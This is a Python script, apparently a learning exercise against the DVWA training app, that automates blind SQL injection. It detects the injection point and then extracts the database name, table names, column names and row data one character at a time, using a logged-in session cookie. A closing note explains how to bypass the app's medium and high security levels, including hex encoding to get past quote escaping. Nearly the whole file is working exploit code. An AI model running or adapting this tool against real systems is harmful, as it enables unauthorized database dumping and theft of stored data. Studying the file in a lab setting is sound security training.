import requests, re


def get_header():
    print('输入处于sql注入界面的完整URL,eg "http://localhost:81/vulnerabilities/sqli_blind/"')
    url = input()


    cookie = input('将已经登陆的PHPSESSID值输入(burp可以抓到,或者审查页面元素查看cookies):')
    headers = {

        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:68.0) Gecko/20100101 Firefox/68.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
        'Referer': f'{url}',
        'Connection': 'close',
        'Cookie': f'security=low; PHPSESSID={cookie}',
        'Upgrade-Insecure-Requests': '1'
    }
    return headers, url


def judge(text):
    try:
        if 'exists' in re.search('User ID.*?database', text).group():
            return 1
        else:
            return 0
    except:
        return 0


def low_res(sql):
    Id = f'?id={sql}&Submit=Submit#'
    # print(url+Id)
    r = requests.get(url + Id, headers=headers).text
    # print(r)
    return judge(r)


def sql_attack(headers, url):
    print('<-- 判断该网页是否存在注入点-->')
    print("注入语句 ---> 1' and '1'='1 , 1' and '1'='2")
    if low_res("1' and '1'='1") != low_res("1' and '1'='2"):
        print('此处存在注入点,并且注入类型为字符型')
    elif low_res("1 and 1=1") != low_res("1 and 1=2"):
        print('此处存在注入点,并且注入类型为数字型')
    else:
        print('不存在注入,退出')
        quit()
    print('\n' * 2)

    print('<-- 猜解数据库名的长度-->')
    print("注入语句 ---> 1' and length(database())=1# ")
    for i in range(10):
        sql = f"1%27+and+length(database())%3D{i}%23"
        if low_res(sql) == 1:
            databasename_num = i
            break
    print(f'数据库名称长度为: {databasename_num}')
    print('\n' * 2)

    print('<-- 猜解数据库名称 -->')
    print("注入语句 ---> 1' and ascii(substr(database(),1,1))>97# ")
    database_name = ''
    for i in range(databasename_num):
        for j in range(65, 123):
            sql = f"1'+and+ascii(substr(database()%2C{i + 1}%2C1))%3D{j}%23"
            if low_res(sql) == 1:
                database_name += chr(j)
                break
    print(f'数据库名称为:{database_name}\n\n')

    print('<-- 猜解库中有几张表 -->')
    print(
        "注入语句 ---> 1' and (select count(table_name) from information_schema.tables where table_schema='[database_name]')=1# ")
    for i in range(9999):
        sql = f"1'+and+(select+count(table_name)+from+information_schema.tables+where+table_schema%3D'{database_name}')%3D{i}%23"
        if low_res(sql) == 1:
            print(f'该库中有{i}张表\n\n')
            table_num = i
            break

    print('<--猜解库中所有的表长度-->')
    print(
        "注入语句 --->  1' and length(substr((select table_name from information_schema.tables where table_schema=[database_name] limit 0,1),1))=9#")
    table_lenth = []
    for i in range(table_num):
        for j in range(9999):
            sql = f"1'+and+length(substr((select+table_name+from+information_schema.tables+where+table_schema%3D'{database_name}'+limit+{i}%2C1)%2C1))%3D{j}%23"
            if low_res(sql) == 1:
                table_lenth.append(j)
                break
    print(f'该库中的表长度为:', end='')
    list(map(lambda i: print(i, end='  '), [i for i in table_lenth]))
    print('\n' * 2)

    table_name = ''
    table_name_list = []
    print('<--猜解所有的表名-->')
    print(
        "注入语句 --->   1' and length(substr((select table_name from information_schema.tables where table_schema=[database_name] limit 0,1),1))=9#")

    for i in range(len(table_lenth)):
        for j in range(table_lenth[i]):
            for g in range(65, 123):
                sql = f"1'+and+ascii(substr((select+table_name+from+information_schema.tables+where+table_schema%3D'{database_name}'+limit+{i}%2C1)%2C{j + 1}))={g}%23"
                if low_res(sql) == 1:
                    table_name += chr(g)
                    print(chr(g), end='')
                    break
        table_name_list.append(table_name)
        table_name = ''
        print('')
    print(f'该库中的表名为:', end='')
    list(map(lambda i: print(i, end='  '), [i for i in table_name_list]))
    print('\n' * 2)

    print('<--猜解表中列数-->')
    print(
        "注入语句 --->   1' and (select count(column_name) from information_schema.columns where table_name=[table_name])=1#")
    list(map(lambda x: print(f'{x[0]}:{x[1]}'), [(x, y) for x, y in enumerate(table_name_list)]))
    table_name = [x for x in table_name_list][int(input('请选择查看哪个表的数据：'))]

    for i in range(9999):
        sql = f"1'+and+(select+count(column_name)+from+information_schema.columns+where+table_name%3D'{table_name}')%3D{i}%23"
        if low_res(sql) == 1:
            print(f'该表中有{i}列\n\n')
            lie_num = i
            break

    print('<--猜解每一列的长度-->')
    print(
        "注入语句 --->   1' and length(substr((select column_name from information_schema.columns where table_name=[table_name] limit 0,1),1))=1#")

    lie_lenth = []
    for i in range(lie_num):
        for j in range(9999):
            sql = f"1'+and+length(substr((select+column_name+from+information_schema.columns+where+table_name%3D'{table_name}'+limit+{i}%2C1)%2C1))%3D{j}%23"
            if low_res(sql) == 1:
                lie_lenth.append(j)
                break

    # print(lie_lenth)
    print(f'该表中每列的长度为:', end='')
    list(map(lambda i: print(i, end=' '), [i for i in lie_lenth]))
    print('\n' * 2)

    print('<--猜解每一列的名称-->')
    print(
        "注入语句 --->   1' and ascii(substr((select column_name from information_schema.columns where table_name=[table_name] limit 0,1),1))=97#")

    lie_name = ''
    lie_name_list = []
    for i in range(len(lie_lenth)):
        for j in range(lie_lenth[i]):
            for g in range(65, 123):
                sql = f"1'+and+ascii(substr((select+column_name+from+information_schema.columns+where+table_name%3D'{table_name}'+limit+{i}%2C1)%2C{j + 1}))%3D{g}%23"
                if low_res(sql) == 1:
                    lie_name += chr(g)
                    print(chr(g), end='')
                    break
        print('')
        lie_name_list.append(lie_name)
        lie_name = ''
    print(f'该库中的表名为:', end='')
    # print(lie_name_list)
    list(map(lambda i: print(i, end='  '), [i for i in lie_name_list]))
    print('\n' * 2)

    print('<--得到数据-->')
    print("注入语句 --->   1' and (ascii(substr((select [lie_name] from [table_name] limit 0,1),1,1)))=97#")

    data = {}

    for xxx in range(999):
        a = input('退出请输入q,选择表请回车')
        if a == 'q':
            break
        else:
            list(map(lambda x: print(f'{x[0]}:{x[1]}'), [(x, y) for x, y in enumerate(lie_name_list)]))
            lie_name = [x for x in lie_name_list][int(input('请选择查看哪个表的数据：'))]
            res = ''
            huancun = []
            for i in range(9999):
                for j in range(1, 9999):
                    for g in range(128):
                        NULL = 0
                        ascii_wu = 0
                        sql = f"1'+and+(ascii(substr((select+{lie_name}+from+{table_name}+limit+{i}%2C1)%2C{j}%2C1)))%3D{g}%23"
                        if low_res(sql) == 1:
                            if g == 0:
                                NULL = 1
                                if res == '':
                                    res == 'NULL'
                                break
                            res += chr(g)
                            print(chr(g), end='')
                            break
                    else:
                        ascii_wu = 1
                    if NULL == 1 or ascii_wu == 1:
                        break
                if ascii_wu == 1:
                    break
                huancun.append(res)
                res = ''
                print()
            data[lie_name] = huancun

    for i in data.keys():
        print(f'\t{i}\t', end='')
    print()
    data_list = list(data.values())
    for i in range(len((data_list)[0])):
        for j in range(len(data_list)):
            print(f'\t{data_list[j][i]}\t', end='')
        print()


if __name__ == '__main__':
    headers, url = get_header()
    sql_attack(headers, url)

    print('''
Low        --> 没什么过滤,直接走一遍盲注的过程就好
Mmedium    --> 界面变为下拉菜单 解决 -> 直接burp抓包修改数据就好
               GET变成POST     解决 -> 修改heards头部,reqesets.post(url = url,data = data,header = header)
                                                                            |
                                                                            V
                                                                        sql注入语句在这里
               字符型改为数字型                                    解决 -> 修改sql语句,将1'改为1
               使用mysqli_real_escape_string函数过滤'"等特殊字符    解决 -> 16进制代替 
High       -->  LIMIT限制       解决 -> 最后加# 注释掉就ok    
                点击弹窗进行验证,实时检查cookie,杜绝了自动化攻击,手注无影响
                随机时间等待,防止使用sleep注入,布尔型不影响

Impossible -->  添加PDO,无懈可击

    ''')


